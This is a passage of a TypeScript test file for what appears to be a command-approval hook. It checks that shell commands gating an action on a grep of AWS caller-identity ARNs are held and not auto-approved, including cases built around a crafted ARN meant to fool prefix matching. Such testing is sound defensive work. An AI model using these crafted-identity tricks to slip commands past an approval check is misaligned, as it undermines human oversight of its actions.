    for (const pattern of [`^arn:aws:sts::${PERSONAL}:assumed-role/Admin/`, `^arn:aws:sts::${PERSONAL}:`, `^arn:aws:iam::${PERSONAL}:user/`]) {
      expect({ pattern, matches: grepMatches(pattern, CRAFTED) }).toEqual({ pattern, matches: false });
    }
  });
  test.each([
    ["iam user prefix", `aws sts get-caller-identity --query Arn --output text | grep -q arn:aws:iam::${PERSONAL}:user/ && ${INVOKE}`],
    ["sts assumed-role prefix", `aws sts get-caller-identity --query Arn --output text | grep -q 'arn:aws:sts::${PERSONAL}:assumed-role/Admin/' && ${INVOKE}`],
    ["whole identity, sts prefix", `aws sts get-caller-identity | grep -q arn:aws:sts::${PERSONAL}: && ${INVOKE}`],
    ["the crafted ARN itself under -x", `aws sts get-caller-identity --query Arn --output text | grep -qx '${CRAFTED}' && ${INVOKE}`],
  ])("holds %p", (_name, command) => {
    expect(bash(command).action).toBe("hold");
  });
  test("control: a guard on an unlisted account holds", () => {
    expect(bash(`aws sts get-caller-identity --query Arn --output text | grep -q arn:aws:iam::${OTHER}:user/ && ${INVOKE}`).action).toBe("hold");
  });
});
